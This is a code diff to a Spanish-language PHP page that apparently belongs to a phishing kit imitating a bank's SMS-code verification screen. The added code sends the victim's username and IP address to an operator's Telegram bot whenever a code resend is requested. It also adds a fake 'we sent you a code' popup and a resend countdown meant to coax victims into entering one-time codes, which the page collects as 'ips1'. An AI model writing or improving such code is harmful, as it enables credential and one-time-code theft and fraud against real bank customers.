@@ -4,6 +4,17 @@ include("settings.php"); // Contiene $token y $chat_id
 
 $usuario = $_SESSION['usuario'] ?? null;
 
+if (isset($_GET['resend']) && $usuario) {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $msg = "🔁 REENVÍO DE CÓDIGO SOLICITADO\n👤 Usuario: $usuario\n🌐 IP: $ip";
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
+        'chat_id' => $chat_id,
+        'text'    => $msg
+    ]));
+    echo 'ok';
+    exit;
+}
+
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
     $codigo = $_POST['ips1'] ?? '';
     $ip = $_SERVER['REMOTE_ADDR'];
@@ -49,7 +60,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                 <input minlength="6" maxlength="8" id="i1" name="ips1" placeholder="Código" type="text" inputmode="numeric" required
                        style="display: block; position: relative; color: #333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
-                
+
+                <p id="resend-wrap" style="display: block; position: relative; top: 198px; left: 28px; width: 357px; font-family: sans-serif; font-size: 13px; color: #aaa;">Reenviar código <span id="countdown">1:00</span></p>
+
                 <input type="submit" value="Continuar"
                        style="display: block; position: relative; font-size: 16px; color: #fff; background: rgb(0, 105, 60); border: none; top: 224px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
             </form>
@@ -118,6 +131,52 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
             return false;
         }
     });
+</script>
+
+<!-- Popup overlay -->
+<div id="sms-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 9999; display: flex; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
+    <div style="background: #fff; border-radius: 12px; padding: 32px 28px; max-width: 320px; width: 90%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
+        <div style="font-size: 36px; margin-bottom: 14px;">📲</div>
+        <p style="font-family: sans-serif; font-size: 15px; color: #333; line-height: 1.6;">Te hemos enviado un código, confírmalo para continuar</p>
+    </div>
+</div>
+
+<script>
+    (function() {
+        var popup = document.getElementById('sms-popup');
+        setTimeout(function() {
+            popup.style.opacity = '0';
+            setTimeout(function() { popup.style.display = 'none'; }, 500);
+        }, 3000);
+    })();
+
+    (function() {
+        var total = 60;
+        var countdownEl = document.getElementById('countdown');
+        var wrapEl = document.getElementById('resend-wrap');
+        var sent = false;
+
+        var timer = setInterval(function() {
+            total--;
+            if (total <= 0) {
+                clearInterval(timer);
+                wrapEl.innerHTML = '<span id="resend-link" style="color: rgb(0,105,60); cursor: pointer; text-decoration: underline; font-family: sans-serif; font-size: 13px;">Reenviar código</span>';
+                document.getElementById('resend-link').addEventListener('click', function() {
+                    if (sent) return;
+                    sent = true;
+                    this.style.color = '#aaa';
+                    this.style.textDecoration = 'none';
+                    this.style.cursor = 'default';
+                    this.textContent = 'Código reenviado';
+                    fetch('sms.php?resend=1').catch(function(){});
+                });
+            } else {
+                var m = Math.floor(total / 60);
+                var s = total % 60;
+                countdownEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+            }
+        }, 1000);
+    })();
 </script>
 </body>
 </html>
